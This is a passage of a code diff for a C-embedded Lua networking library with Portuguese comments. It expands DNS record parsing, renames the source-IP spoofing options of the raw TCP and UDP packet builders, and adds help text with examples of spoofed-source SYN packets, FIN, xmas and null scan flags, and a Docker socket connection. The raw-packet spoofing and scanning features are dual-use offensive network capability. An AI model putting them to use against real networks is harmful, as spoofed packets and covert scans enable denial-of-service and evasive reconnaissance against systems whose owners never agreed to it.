+            lua_pushstring(L,name);     lua_setfield(L,-2,"exchange");
+            lua_rawseti(L,-2,idx++);
+        } else if (qtype==ns_t_txt) {
+            int off=0;
+            while (off<rdlen) {
+                int tlen=rd[off++];
+                if (off+tlen>rdlen) break;
+                lua_pushlstring(L,(char*)rd+off,tlen);
+                lua_rawseti(L,-2,idx++);
+                off+=tlen;
+            }
+        } else if (qtype==ns_t_srv) {
+            if (rdlen<6) continue;
+            uint16_t prio  =ntohs(*(uint16_t*)(rd+0));
+            uint16_t weight=ntohs(*(uint16_t*)(rd+2));
+            uint16_t port  =ntohs(*(uint16_t*)(rd+4));
+            if (ns_name_uncompress(buf,buf+len,rd+6,name,sizeof(name))<0) continue;
+            lua_newtable(L);
+            lua_pushinteger(L,prio);   lua_setfield(L,-2,"priority");
+            lua_pushinteger(L,weight); lua_setfield(L,-2,"weight");
+            lua_pushinteger(L,port);   lua_setfield(L,-2,"port");
+            lua_pushstring(L,name);    lua_setfield(L,-2,"target");
+            lua_rawseti(L,-2,idx++);
+        } else {
+            /* NS / PTR / CNAME — descomprime nome */
+            if (ns_name_uncompress(buf,buf+len,rd,name,sizeof(name))>=0) {
+                lua_pushstring(L,name); lua_rawseti(L,-2,idx++);
+            }
         }
     }
-    freeaddrinfo(res);
     return 1;
 }
 
@@ -38555,8 +38844,8 @@ static int l_net_dns(lua_State *L) {
  *   net.raw.tcp(ip, port, "SYN|ACK")           -- multiplas flags
  *   net.raw.tcp(ip, port, {                    -- controle total (tudo opcional):
  *     flags="SYN",       -- "SYN"|"RST"|"FIN"|"SYN|ACK"|"xmas"|"null"|0x02
- *     spoof_ip="1.2.3.5",  -- IP de origem spoofado
- *     spoof_port=12345,    -- porta origem (default: aleatoria)
+ *     spfip="1.2.3.5",  -- IP de origem spoofado
+ *     spfport=12345,    -- porta origem (default: aleatoria)
  *     seq=0xdeadbeef,    -- sequence number (default: aleatorio)
  *     ack_seq=0,         -- ack number
  *     window=65535,      -- tamanho da janela TCP
@@ -38577,7 +38866,7 @@ static int l_net_dns(lua_State *L) {
  *
  * UDP raw com spoof:
  *   net.raw.udp(ip, port, data)
- *   net.raw.udp(ip, port, data, {spoof_ip="x", spoof_port=53, ttl=128, tos=0})
+ *   net.raw.udp(ip, port, data, {spfip="x", spfport=53, ttl=128, tos=0})
  *
  * RECEBER pacote raw (novo):
  *   net.raw.recv(proto, timeout)              -- proto: "tcp"|"udp"|"icmp"|numero
@@ -38585,9 +38874,9 @@ static int l_net_dns(lua_State *L) {
  *   net.raw.recv("tcp", 5, function(p)        -- filtro Lua (rejeita ate aceitar)
  *     return (p.flags & 0x12) == 0x12         --   so SYN+ACK
  *   end)
- *   -- retorna tabela: spoof_ip, dst_ip, ttl, proto, raw (pacote completo)
- *   --   + TCP:  spoof_port, dst_port, seq, ack_seq, flags, flags_s, window, payload
- *   --   + UDP:  spoof_port, dst_port, len, payload
+ *   -- retorna tabela: spfip, dst_ip, ttl, proto, raw (pacote completo)
+ *   --   + TCP:  spfport, dst_port, seq, ack_seq, flags, flags_s, window, payload
+ *   --   + UDP:  spfport, dst_port, len, payload
  *   --   + ICMP: type, code, id, seq, payload
  *
  * Packet raw (controle total — voce passa o payload completo):
@@ -38642,7 +38931,7 @@ static int raw_tcp_send(lua_State *L,
     }
 
     srand((unsigned)time(NULL) ^ (unsigned)getpid());
-    uint16_t spoof_port = (uint16_t)(1024 + rand() % 64511);
+    uint16_t spfport = (uint16_t)(1024 + rand() % 64511);
     uint32_t seq      = (uint32_t)rand();
 
     /* ── Pacote: IP (20) + TCP (20) = 40 bytes ─── */
@@ -38665,8 +38954,8 @@ static int raw_tcp_send(lua_State *L,
     memcpy(pkt+16, &dst.sin_addr.s_addr, 4);
 
     /* TCP header (offset 20) */
-    pkt[20] = (spoof_port >> 8) & 0xff;
-    pkt[21] =  spoof_port       & 0xff;
+    pkt[20] = (spfport >> 8) & 0xff;
+    pkt[21] =  spfport       & 0xff;
     pkt[22] = (dst_port >> 8) & 0xff;
     pkt[23] =  dst_port       & 0xff;
     pkt[24] = (seq >> 24) & 0xff;          /* seq number                  */
@@ -38823,7 +39112,7 @@ static void raw_flags_to_str(uint8_t f, char *out, size_t sz) {
  *   dst_port  — porta destino (obrigatório)
  *   flags     — flags TCP (RTCP_SYN etc.)
  *   src_ip_s  — IP origem spoofado (NULL = kernel preenche)
- *   spoof_port  — porta origem (0 = aleatória)
+ *   spfport  — porta origem (0 = aleatória)
  *   seq       — sequence number (0 = aleatório)
  *   ack_seq   — ack sequence (default 0)
  *   window    — tamanho da janela (0 = 64240)
@@ -38838,7 +39127,7 @@ static int raw_tcp_send_ex(lua_State *L,
     const char *dst_ip, int dst_port,
     uint8_t flags,
     const char *src_ip_s,
-    uint16_t spoof_port,
+    uint16_t spfport,
     uint32_t seq,
     uint32_t ack_seq,
     uint16_t window,
@@ -38865,8 +39154,8 @@ static int raw_tcp_send_ex(lua_State *L,
     }
 
     srand((unsigned)time(NULL)^(unsigned)getpid());
-    int was_random_port = (spoof_port == 0);
-    if (!spoof_port) spoof_port=(uint16_t)(1024+rand()%64511);
+    int was_random_port = (spfport == 0);
+    if (!spfport) spfport=(uint16_t)(1024+rand()%64511);
     if (!seq)      seq=(uint32_t)rand();
     if (!window)   window=64240;
     if (!ttl)      ttl=64;
@@ -38882,7 +39171,7 @@ static int raw_tcp_send_ex(lua_State *L,
     pkt[8]=ttl; pkt[9]=IPPROTO_TCP;
     if (src_ip_s) {
         if (strcmp(src_ip_s, "0") == 0) {
-            /* spoof_ip="0" → IP de origem completamente aleatório */
+            /* spfip="0" → IP de origem completamente aleatório */
             uint8_t a;
             do { a=(uint8_t)(rand()%256); } while(a==0||a==127||a>=224);
             pkt[12]=a;
@@ -38894,7 +39183,7 @@ static int raw_tcp_send_ex(lua_State *L,
             if (inet_pton(AF_INET,src_ip_s,&sa) != 1) {
                 free(pkt); close(fd);
                 lua_pushnil(L);
-                lua_pushfstring(L,"spoof_ip: endereco IPv4 invalido: '%s' (use \"0\" para IP aleatorio)", src_ip_s);
+                lua_pushfstring(L,"spfip: endereco IPv4 invalido: '%s' (use \"0\" para IP aleatorio)", src_ip_s);
                 return 2;
             }
             memcpy(pkt+12,&sa.s_addr,4);
@@ -38903,7 +39192,7 @@ static int raw_tcp_send_ex(lua_State *L,
     memcpy(pkt+16,&dst.sin_addr.s_addr,4);
 
     /* ── TCP header ── */
-    pkt[20]=(spoof_port>>8)&0xff; pkt[21]=spoof_port&0xff;
+    pkt[20]=(spfport>>8)&0xff; pkt[21]=spfport&0xff;
     pkt[22]=(dst_port>>8)&0xff; pkt[23]=dst_port&0xff;
     pkt[24]=(seq>>24)&0xff; pkt[25]=(seq>>16)&0xff;
     pkt[26]=(seq>> 8)&0xff; pkt[27]=seq&0xff;
@@ -38939,7 +39228,7 @@ static int raw_tcp_send_ex(lua_State *L,
     lua_pushboolean(L,1);
     int nret = 1;
     if (was_random)      { lua_pushstring(L, chosen_ip);               nret++; }
-    if (was_random_port) { lua_pushinteger(L, (lua_Integer)spoof_port); nret++; }
+    if (was_random_port) { lua_pushinteger(L, (lua_Integer)spfport); nret++; }
     return nret;
 }
 
@@ -39009,8 +39298,8 @@ static int l_net_raw_null(lua_State *L) {
  *   string  → flags direto: net.raw.tcp("1.2.3.4", 80, "SYN|ACK")
  *   tabela  → controle completo:
  *     .flags    = "SYN"/"RST"/"SYN|ACK"/"xmas"/"null"/0x02/número
- *     .spoof_ip   = IP de origem spoofado (ex: "1.2.3.5")
- *     .spoof_port = porta de origem (default: aleatória)
+ *     .spfip   = IP de origem spoofado (ex: "1.2.3.5")
+ *     .spfport = porta de origem (default: aleatória)
  *     .seq      = sequence number (default: aleatório)
  *     .ack_seq  = ack number (default: 0)
  *     .window   = tamanho da janela TCP (default: 64240)
@@ -39026,7 +39315,7 @@ static int l_net_raw_null(lua_State *L) {
  *   net.raw.tcp("10.0.0.1", 80)                          -- SYN simples
  *   net.raw.tcp("10.0.0.1", 80, "RST")
  *   net.raw.tcp("10.0.0.1", 80, "SYN|ACK")
- *   net.raw.tcp("10.0.0.1", 80, {flags="SYN", spoof_ip="9.9.9.9"})
+ *   net.raw.tcp("10.0.0.1", 80, {flags="SYN", spfip="9.9.9.9"})
  *   net.raw.tcp("10.0.0.1", 80, {flags="PSH|ACK", payload="GET / HTTP/1.0\r\n\r\n"})
  */
 static int l_net_raw_tcp(lua_State *L) {
@@ -39034,8 +39323,8 @@ static int l_net_raw_tcp(lua_State *L) {
     int         port = (int)luaL_checkinteger(L,2);
 
     uint8_t     flags    = RTCP_SYN;
-    const char *spoof_ip   = NULL;
-    uint16_t    spoof_port = 0;
+    const char *spfip   = NULL;
+    uint16_t    spfport = 0;
     uint32_t    seq      = 0;
     uint32_t    ack_seq  = 0;
     uint16_t    window   = 0;
@@ -39056,7 +39345,7 @@ static int l_net_raw_tcp(lua_State *L) {
         /* valida chaves desconhecidas antes de ler qualquer campo */
         {
             static const char *tcp_keys[] = {
-                "flags","spoof_ip","spoof_port","seq","ack_seq",
+                "flags","spfip","spfport","seq","ack_seq",
                 "window","ttl","tos","urgent","payload","timeout", NULL
             };
             char errbuf[512];
@@ -39090,29 +39379,29 @@ static int l_net_raw_tcp(lua_State *L) {
             return 2;
         }
         lua_pop(L,1);
-        lua_getfield(L,3,"spoof_ip");
+        lua_getfield(L,3,"spfip");
         if (lua_isstring(L,-1)) {
-            spoof_ip = lua_tostring(L,-1);
+            spfip = lua_tostring(L,-1);
         } else if (lua_isnumber(L,-1) && lua_tointeger(L,-1) == 0) {
-            spoof_ip = "0";
+            spfip = "0";
         } else if (!lua_isnil(L,-1)) {
             lua_pop(L,1); lua_pushnil(L);
-            lua_pushstring(L,"spoof_ip: deve ser string (IP ou \"0\"/0 para aleatorio)"); return 2;
+            lua_pushstring(L,"spfip: deve ser string (IP ou \"0\"/0 para aleatorio)"); return 2;
         }
         lua_pop(L,1);
-        /* valida spoof_port */
-        lua_getfield(L,3,"spoof_port");
+        /* valida spfport */
+        lua_getfield(L,3,"spfport");
         if (!lua_isnil(L,-1) && !lua_isnumber(L,-1)) {
             lua_pop(L,1); lua_pushnil(L);
-            lua_pushstring(L,"spoof_port: deve ser um numero (1..65535)"); return 2;
+            lua_pushstring(L,"spfport: deve ser um numero (1..65535)"); return 2;
         }
         if (lua_isnumber(L,-1)) {
             lua_Integer sp = lua_tointeger(L,-1);
             if (sp < 0 || sp > 65535) {
                 lua_pop(L,1); lua_pushnil(L);
-                lua_pushfstring(L,"spoof_port: fora de range: %d (esperado 0..65535, 0=aleatorio)",(int)sp); return 2;
+                lua_pushfstring(L,"spfport: fora de range: %d (esperado 0..65535, 0=aleatorio)",(int)sp); return 2;
             }
-            spoof_port=(uint16_t)sp; /* 0 = aleatorio em raw_tcp_send_ex */
+            spfport=(uint16_t)sp; /* 0 = aleatorio em raw_tcp_send_ex */
         }
         lua_pop(L,1);
         _OPT_U32("seq",     seq);
@@ -39163,7 +39452,7 @@ static int l_net_raw_tcp(lua_State *L) {
         lua_pushnil(L);
         lua_pushfstring(L,
             "argumento 3: esperado string (flags) ou tabela de opcoes, recebeu %s\n"
-            "  Exemplos: \"SYN\", \"SYN|ACK\", {flags=\"RST\", spoof_ip=\"1.2.3.4\"}",
+            "  Exemplos: \"SYN\", \"SYN|ACK\", {flags=\"RST\", spfip=\"1.2.3.4\"}",
             lua_typename(L, lua_type(L,3)));
         return 2;
     } else {
@@ -39171,7 +39460,7 @@ static int l_net_raw_tcp(lua_State *L) {
     }
 
     return raw_tcp_send_ex(L, ip, port, flags,
-        spoof_ip, spoof_port, seq, ack_seq,
+        spfip, spfport, seq, ack_seq,
         window, ttl, tos, urg_ptr,
         payload, plen, timeout);
 }
@@ -39392,8 +39681,8 @@ static int l_net_raw_icmp(lua_State *L) {
  * net.raw.udp(ip, port, data [, opts])
  *
  * Envia pacote UDP raw. opts pode ser número (timeout, compat) ou tabela:
- *   .spoof_ip   = IP de origem spoofado
- *   .spoof_port = porta de origem (default: aleatória)
+ *   .spfip   = IP de origem spoofado
+ *   .spfport = porta de origem (default: aleatória)
  *   .ttl      = TTL do pacote IP (default: 64)
  *   .tos      = Type of Service (default: 0)
  *   .timeout  = timeout (default: 3)
@@ -39402,7 +39691,7 @@ static int l_net_raw_icmp(lua_State *L) {
  *
  * Exemplos:
  *   net.raw.udp("1.2.3.4", 53, "\x00\x01...")
- *   net.raw.udp("1.2.3.4", 53, data, {spoof_ip="5.6.7.8", ttl=128})
+ *   net.raw.udp("1.2.3.4", 53, data, {spfip="5.6.7.8", ttl=128})
  */
 static int l_net_raw_udp(lua_State *L) {
     const char *dst_ip   = luaL_checkstring(L,1);
@@ -39411,7 +39700,7 @@ static int l_net_raw_udp(lua_State *L) {
     const char *data     = luaL_checklstring(L,3,&dlen);
 
     const char *src_ip_s = NULL;
-    uint16_t    spoof_port = 0;
+    uint16_t    spfport = 0;
     uint8_t     ttl      = 64;
     uint8_t     tos      = 0;
     int         timeout  = 3;
@@ -39427,36 +39716,36 @@ static int l_net_raw_udp(lua_State *L) {
         /* valida chaves desconhecidas */
         {
             static const char *udp_keys[] = {
-                "spoof_ip","spoof_port","ttl","tos","timeout", NULL
+                "spfip","spfport","ttl","tos","timeout", NULL
             };
             char errbuf[512];
             if (raw_check_table_keys(L, 4, udp_keys, errbuf, sizeof(errbuf)) < 0) {
                 lua_pushnil(L); lua_pushstring(L, errbuf); return 2;
             }
         }
-        lua_getfield(L,4,"spoof_ip");
+        lua_getfield(L,4,"spfip");
         if (lua_isstring(L,-1)) {
             src_ip_s = lua_tostring(L,-1);
         } else if (lua_isnumber(L,-1) && lua_tointeger(L,-1) == 0) {
             src_ip_s = "0";
         } else if (!lua_isnil(L,-1)) {
             lua_pop(L,1); lua_pushnil(L);
-            lua_pushstring(L,"spoof_ip: deve ser string (IP ou \"0\"/0 para aleatorio)"); return 2;
+            lua_pushstring(L,"spfip: deve ser string (IP ou \"0\"/0 para aleatorio)"); return 2;
         }
         lua_pop(L,1);
 
-        lua_getfield(L,4,"spoof_port");
+        lua_getfield(L,4,"spfport");
         if (!lua_isnil(L,-1) && !lua_isnumber(L,-1)) {
             lua_pop(L,1);
-            lua_pushnil(L); lua_pushstring(L,"spoof_port: deve ser um numero (1..65535)"); return 2;
+            lua_pushnil(L); lua_pushstring(L,"spfport: deve ser um numero (1..65535)"); return 2;
         }
         if(lua_isnumber(L,-1)) {
             lua_Integer sp = lua_tointeger(L,-1);
             if (sp < 0 || sp > 65535) {
                 lua_pop(L,1);
-                lua_pushnil(L); lua_pushfstring(L,"spoof_port: fora de range: %d (esperado 0..65535, 0=aleatorio)",(int)sp); return 2;
+                lua_pushnil(L); lua_pushfstring(L,"spfport: fora de range: %d (esperado 0..65535, 0=aleatorio)",(int)sp); return 2;
             }
-            spoof_port=(uint16_t)sp; /* 0 = aleatorio em raw_udp_send_ex */
+            spfport=(uint16_t)sp; /* 0 = aleatorio em raw_udp_send_ex */
         }
         lua_pop(L,1);
 
@@ -39518,8 +39807,8 @@ static int l_net_raw_udp(lua_State *L) {
     }
 
     srand((unsigned)time(NULL)^(unsigned)getpid());
-    int was_random_port = (spoof_port == 0);
-    if (!spoof_port) spoof_port=(uint16_t)(1024+rand()%64511);
+    int was_random_port = (spfport == 0);
+    if (!spfport) spfport=(uint16_t)(1024+rand()%64511);
     size_t pkt_len=20+8+dlen;
     uint8_t *pkt=(uint8_t*)calloc(1,pkt_len);
     if (!pkt){ close(fd); lua_pushnil(L); lua_pushstring(L,"sem memoria"); return 2; }
@@ -39532,7 +39821,7 @@ static int l_net_raw_udp(lua_State *L) {
     pkt[8]=ttl; pkt[9]=IPPROTO_UDP;
     if (src_ip_s) {
         if (strcmp(src_ip_s, "0") == 0) {
-            /* spoof_ip="0" → IP de origem completamente aleatório */
+            /* spfip="0" → IP de origem completamente aleatório */
             uint8_t a;
             do { a=(uint8_t)(rand()%256); } while(a==0||a==127||a>=224);
             pkt[12]=a;
@@ -39544,7 +39833,7 @@ static int l_net_raw_udp(lua_State *L) {
             if (inet_pton(AF_INET,src_ip_s,&sa) != 1) {
                 free(pkt); close(fd);
                 lua_pushnil(L);
-                lua_pushfstring(L,"spoof_ip: endereco IPv4 invalido: '%s' (use \"0\" para IP aleatorio)", src_ip_s);
+                lua_pushfstring(L,"spfip: endereco IPv4 invalido: '%s' (use \"0\" para IP aleatorio)", src_ip_s);
                 return 2;
             }
             memcpy(pkt+12,&sa.s_addr,4);
@@ -39552,7 +39841,7 @@ static int l_net_raw_udp(lua_State *L) {
     }
     memcpy(pkt+16,&dst.sin_addr.s_addr,4);
     /* UDP header */
-    pkt[20]=(spoof_port>>8)&0xff; pkt[21]=spoof_port&0xff;
+    pkt[20]=(spfport>>8)&0xff; pkt[21]=spfport&0xff;
     pkt[22]=(dst_port>>8)&0xff; pkt[23]=dst_port&0xff;
     pkt[24]=(udp_len >>8)&0xff; pkt[25]=udp_len &0xff;
     /* checksum=0 desabilitado */
@@ -39572,7 +39861,7 @@ static int l_net_raw_udp(lua_State *L) {
     lua_pushboolean(L,1);
     int nret = 1;
     if (was_random)      { lua_pushstring(L, chosen_ip);               nret++; }
-    if (was_random_port) { lua_pushinteger(L, (lua_Integer)spoof_port); nret++; }
+    if (was_random_port) { lua_pushinteger(L, (lua_Integer)spfport); nret++; }
     return nret;
 }
 
@@ -39583,12 +39872,12 @@ static int l_net_raw_udp(lua_State *L) {
  * proto: "tcp", "udp", "icmp", "raw" ou número de protocolo IP
  *
  * Campos sempre presentes:
- *   .spoof_ip, .dst_ip, .ttl, .proto, .raw (pacote completo como string)
+ *   .spfip, .dst_ip, .ttl, .proto, .raw (pacote completo como string)
  *
  * Campos extras por protocolo:
- *   TCP:  .spoof_port, .dst_port, .seq, .ack_seq, .flags (número),
+ *   TCP:  .spfport, .dst_port, .seq, .ack_seq, .flags (número),
  *         .flags_s (string "SYN|ACK"), .window, .payload
- *   UDP:  .spoof_port, .dst_port, .len, .payload
+ *   UDP:  .spfport, .dst_port, .len, .payload
  *   ICMP: .type, .code, .id, .seq, .payload
  *
  * filtro: função Lua opcional — recebe a tabela e retorna true para aceitar
@@ -39599,7 +39888,7 @@ static int l_net_raw_udp(lua_State *L) {
  * Exemplos:
  *   -- captura qualquer pacote TCP
  *   local pkt = net.raw.recv("tcp", 5)
- *   print(pkt.spoof_ip, pkt.flags_s, pkt.payload)
+ *   print(pkt.spfip, pkt.flags_s, pkt.payload)
  *
  *   -- só aceita SYN|ACK (resposta a SYN scan)
  *   local pkt = net.raw.recv("tcp", 5, function(p)
@@ -39608,7 +39897,7 @@ static int l_net_raw_udp(lua_State *L) {
  *
  *   -- captura ICMP de um IP específico
  *   local pkt = net.raw.recv("icmp", 3, function(p)
- *     return p.spoof_ip == "8.8.8.8"
+ *     return p.spfip == "8.8.8.8"
  *   end)
  */
 static int l_net_raw_recv(lua_State *L) {
@@ -40324,10 +40613,22 @@ static int l_net_help(lua_State *L) {
     /* ══ DNS / PING / OS ════════════════════════════════════════════════ */
     printf("\033[1;33m━━━ DNS / PING / SCAN / OS ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m\n\n");
 
-    printf("  \033[1;32mnet.dns(host [,tipo])\033[0m\n");
-    printf("    Resolve um hostname. tipo: 'A' (IPv4, padrão), 'AAAA' (IPv6), 'ANY'.\n");
-    printf("    Retorna: tabela de strings com os IPs encontrados.\n");
-    printf("    Ex: for _,ip in ipairs(net.dns('google.com')) do print(ip) end\n\n");
+    printf("  \033[1;32mnet.dns(host [, tipo])\033[0m\n");
+    printf("    Consulta DNS completo. Tipos suportados:\n");
+    printf("      A     → tabela de strings com IPv4 (padrão)\n");
+    printf("      AAAA  → tabela de strings com IPv6\n");
+    printf("      ANY   → IPv4 + IPv6\n");
+    printf("      MX    → tabela de {priority, exchange}\n");
+    printf("      TXT   → tabela de strings\n");
+    printf("      SRV   → tabela de {priority, weight, port, target}\n");
+    printf("      NS    → tabela de strings (nameservers)\n");
+    printf("      PTR   → tabela de strings (reverso)\n");
+    printf("      CNAME → tabela de strings\n");
+    printf("    Exemplos:\n");
+    printf("      net.dns('google.com')          -- A: {'142.250.x.x', ...}\n");
+    printf("      net.dns('gmail.com', 'MX')     -- {{priority=10, exchange='alt1...'}}\n");
+    printf("      net.dns('google.com', 'TXT')   -- {'v=spf1 ...', ...}\n");
+    printf("      net.dns('_http._tcp.x', 'SRV') -- {{priority=10, weight=5, port=80, target='...'}}\n\n");
 
     printf("  \033[1;32mnet.ping(host)\033[0m\n");
     printf("    Ping via shell do sistema. Retorna true se o host respondeu.\n");
@@ -40372,10 +40673,14 @@ static int l_net_help(lua_State *L) {
     printf("  \033[1;32mnet.tcp6(host, port [,timeout])\033[0m  → objeto socket TCP IPv6\n");
     printf("  \033[1;32mnet.udp(host, port [,timeout])\033[0m   → objeto socket UDP\n");
     printf("  \033[1;32mnet.tls(host, port [,timeout])\033[0m   → TCP + TLS/SSL\n");
-    printf("  \033[1;32mnet.ws(host, port [,path, timeout])\033[0m → WebSocket (ws://)\n");
-    printf("  \033[1;32mnet.wss(host, port [,path, timeout])\033[0m → WebSocket sobre TLS (wss://)\n");
-    printf("    s:ws_send(msg [,opcode]) envia frame WS (1=text, 2=binary)\n");
-    printf("    s:ws_recv()              retorna payload, opcode\n");
+    printf("  \033[1;32mnet.ws(url [,timeout])\033[0m             → WebSocket (ws:// ou wss://)\n");
+    printf("  \033[1;32mnet.ws(host, port [,path, timeout])\033[0m → WebSocket posicional\n");
+    printf("    Aceita URL completa: net.ws(\"ws://echo.websocket.org/\")\n");
+    printf("    Redireciona wss:// automaticamente pelo TLS.\n");
+    printf("    s:ws_send(msg [,opcode]) — envia frame WS (1=text, 2=binary)\n");
+    printf("    s:ws_recv()              — retorna payload, opcode\n");
+    printf("  \033[1;32mnet.unix(path [,timeout])\033[0m          → Unix domain socket (conectado)\n");
+    printf("    Ex: local s = net.unix(\"/var/run/docker.sock\")\n");
     printf("  \033[1;32mnet.listen(port [,host [,backlog]])\033[0m → objeto servidor TCP\n\n");
 
     printf("  Métodos do objeto retornado (s):\n");
@@ -40405,16 +40710,17 @@ static int l_net_help(lua_State *L) {
     /* ══ SOCKETEX ═══════════════════════════════════════════════════════ */
     printf("\033[1;33m━━━ net.socket — API ESTILO LUASOCKET ━━━━━━━━━━━━━━━━━━━━━━━\033[0m\n\n");
 
-    printf("  net.socket é uma TABELA (não uma função). Você acessa suas funções\n");
-    printf("  como campos: socket = net.socket, depois socket.tcp(), etc.\n");
-    printf("  A interface é intencionalmente idêntica à biblioteca LuaSocket.\n\n");
+    printf("  \033[1;32mnet.socket(proto)\033[0m\n");
+    printf("    Cria um socket pelo protocolo. proto pode ser maiúsculo ou minúsculo.\n");
+    printf("    A interface é intencionalmente idêntica à biblioteca LuaSocket.\n\n");
 
-    printf("  \033[1;32msocket.tcp()\033[0m  /  \033[1;32msocket.tcp4()\033[0m  /  \033[1;32msocket.tcp6()\033[0m\n");
-    printf("    Cria um socket TCP (IPv4 ou IPv6). Retorna objeto.\n");
-    printf("    Ainda não está conectado — você chama :connect() depois.\n\n");
-
-    printf("  \033[1;32msocket.udp()\033[0m\n");
-    printf("    Cria um socket UDP. Retorna objeto.\n\n");
+    printf("  \033[0;36mProtocolos disponíveis:\033[0m\n");
+    printf("    net.socket(\"tcp\")   — TCP IPv4.  Alias: \"TCP\", \"tcp4\"\n");
+    printf("    net.socket(\"tcp6\")  — TCP IPv6.\n");
+    printf("    net.socket(\"udp\")   — UDP IPv4.\n");
+    printf("    net.socket(\"unix\")  — Unix domain socket (AF_UNIX).\n");
+    printf("    O socket criado ainda não está conectado — chame :connect() depois.\n");
+    printf("    Para unix: s:connect(\"/var/run/meu.sock\")  (path no lugar do host)\n\n");
 
     printf("  \033[0;36mMétodos TCP:\033[0m\n");
     printf("    t:connect(host, port)         Conecta ao servidor.\n");
@@ -40522,51 +40828,41 @@ static int l_net_help(lua_State *L) {
 
     printf("  \033[0;36mExemplos socket:\033[0m\n");
     printf("    -- HTTP manual\n");
-    printf("    local socket = net.socket\n");
-    printf("    local t = assert(socket.tcp())\n");
+    printf("    local t = assert(net.socket('tcp'))\n");
     printf("    t:settimeout(5)\n");
     printf("    assert(t:connect('example.com', 80))\n");
     printf("    t:send('GET / HTTP/1.0\\r\\nHost: example.com\\r\\n\\r\\n')\n");
     printf("    print(t:receive('*a'))\n");
     printf("    t:close()\n\n");
     printf("    -- Servidor TCP\n");
-    printf("    local srv = assert(net.socket.bind('*', 9000))\n");
+    printf("    local srv = assert(net.socket('tcp'))\n");
+    printf("    assert(srv:bind('*', 9000))\n");
+    printf("    assert(srv:listen())\n");
     printf("    local cli = assert(srv:accept())\n");
     printf("    local linha = cli:receive()  -- lê uma linha\n");
     printf("    cli:send(linha .. '\\n')      -- ecoa de volta\n");
     printf("    cli:close()  srv:close()\n\n");
-    printf("    -- Código limpo com try/protect\n");
-    printf("    local socket = net.socket\n");
-    printf("    local fn = socket.protect(function()\n");
-    printf("      local t = socket.try(socket.tcp())\n");
-    printf("      local try = socket.newtry(function() t:close() end)\n");
-    printf("      t:settimeout(5)\n");
-    printf("      try(t:connect('example.com', 80))\n");
-    printf("      try(t:send('GET / HTTP/1.0\\r\\nHost: example.com\\r\\n\\r\\n'))\n");
-    printf("      local resp = try(t:receive('*l'))\n");
-    printf("      t:close()\n");
-    printf("      return resp\n");
-    printf("    end)\n");
-    printf("    local ok, err = fn()\n");
-    printf("    if ok then print(ok) else print('erro:', err) end\n\n");
     printf("    -- UDP\n");
-    printf("    local u = assert(net.socket.udp())\n");
+    printf("    local u = assert(net.socket('udp'))\n");
     printf("    u:settimeout(3)\n");
     printf("    u:sendto('hello', '192.168.1.1', 9000)\n");
     printf("    local data, ip, port = u:receivefrom()\n");
     printf("    u:close()\n\n");
     printf("    -- select: multiplexação\n");
-    printf("    local a = assert(net.socket.connect('host1.com', 80))\n");
-    printf("    local b = assert(net.socket.connect('host2.com', 80))\n");
+    printf("    local a = assert(net.socket('tcp'))\n");
+    printf("    assert(a:connect('host1.com', 80))\n");
+    printf("    local b = assert(net.socket('tcp'))\n");
+    printf("    assert(b:connect('host2.com', 80))\n");
     printf("    local prontos = net.socket.select({a, b}, {}, 2.0)\n");
     printf("    for _, s in ipairs(prontos) do print(s:receive('*l')) end\n\n");
 
     /* ══ SOCKETEX RAW ═══════════════════════════════════════════════════ */
     printf("\033[1;33m━━━ net.socket.raw — RAW OOP (requer --sudo + root) ━━━━━━━━━\033[0m\n\n");
 
-    printf("  \033[1;32msocket.raw(proto)\033[0m\n");
+    printf("  \033[1;32mnet.socket.raw(proto [, opts])\033[0m\n");
     printf("    Cria um socket raw como OBJETO OOP (igual ao tcp/udp acima).\n");
     printf("    Você mantém o fd aberto e pode enviar/receber múltiplas vezes.\n");
+    printf("    opts: tabela opcional com configurações iniciais (veja abaixo).\n");
     printf("    Se passar um proto inválido: retorna nil, 'protocolo desconhecido: X'\n\n");
 
     printf("  \033[0;36mModo protocolo — você controla o payload:\033[0m\n");
@@ -40607,6 +40903,26 @@ static int l_net_help(lua_State *L) {
     printf("      r:settimeout(seg)                Define timeout.\n");
     printf("      r:close()                       Fecha o socket.\n\n");
 
+    printf("  \033[0;36mOpts — tabela opcional no construtor (todos os campos opcionais):\033[0m\n");
+    printf("    socket.raw('syn', {\n");
+    printf("      spfip   = \"1.2.3.4\", -- IP de origem spoofado\n");
+    printf("                               --   \"0\" ou 0 = aleatório → sendto retorna true, ip_usado\n");
+    printf("      spfport = 12345,      -- porta de origem (0 = aleatória)\n");
+    printf("      ttl        = 64,         -- TTL do pacote IP (0 = padrão do SO)\n");
+    printf("      tos        = 0,          -- Type of Service\n");
+    printf("      seq        = 0x41414141, -- TCP sequence number (0 = aleatório)\n");
+    printf("      ack_seq    = 0,          -- TCP ack number\n");
+    printf("      window     = 65535,      -- janela TCP (0 = 64240)\n");
+    printf("      urg_ptr    = 0,          -- ponteiro urgente TCP\n");
+    printf("      payload    = \"dados\",    -- bytes após o header TCP\n");
+    printf("      flags      = \"SYN\",      -- sobrescreve a flag do proto (só modo rawflags)\n");
+    printf("                               --   string: SYN RST FIN ACK PSH URG xmas null\n");
+    printf("                               --   combinações: \"SYN|ACK\", \"FIN|PSH|URG\"\n");
+    printf("                               --   ou número hex: 0x02 (SYN), 0x12 (SYN+ACK)\n");
+    printf("    })\n\n");
+    printf("    Os mesmos campos valem para socket.raw('icmp'), socket.raw('raw'), etc.\n");
+    printf("    (flags só é aplicado em modo rawflags — syn/rst/ack/fin/psh/synack/xmas/null)\n\n");
+
     printf("  \033[0;36mExemplos socket.raw:\033[0m\n");
     printf("    local socket = net.socket\n\n");
     printf("    -- ICMP ping manual (você monta o pacote)\n");
@@ -40617,13 +40933,14 @@ static int l_net_help(lua_State *L) {
     printf("    local resp, src = r:receivefrom()\n");
     printf("    print('resposta de', src, #resp, 'bytes')\n");
     printf("    r:close()\n\n");
-    printf("    -- SYN flag: o objeto já sabe o que enviar\n");
-    printf("    local r = assert(socket.raw('syn'))\n");
-    printf("    r:sendto('192.168.1.1', 80)   -- monta SYN automaticamente\n");
+    printf("    -- SYN com IP spoofado e TTL customizado\n");
+    printf("    local r = assert(socket.raw('syn', { spfip='0', ttl=128, window=1024 }))\n");
+    printf("    local ok, ip_usado = r:sendto('192.168.1.1', 80)\n");
+    printf("    print('enviou de', ip_usado)  -- ip_usado preenchido quando spfip='0'\n");
     printf("    r:sendto('192.168.1.1', 443)  -- reutiliza o mesmo socket\n");
     printf("    r:close()\n\n");
-    printf("    -- FIN scan\n");
-    printf("    local r = assert(socket.raw('fin'))\n");
